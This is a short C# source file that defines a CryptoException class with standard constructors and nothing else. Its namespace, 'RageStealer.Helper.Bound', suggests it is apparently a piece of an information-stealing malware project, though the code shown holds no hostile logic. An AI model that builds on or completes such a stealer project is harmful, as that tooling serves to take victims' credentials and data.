using System;

namespace RageStealer.Helper.Bound;

[Serializable]
public class CryptoException : Exception
{
	public CryptoException()
	{
	}

	public CryptoException(string message)
		: base(message)
	{
	}

	public CryptoException(string message, Exception exception)
		: base(message, exception)
	{
	}
}
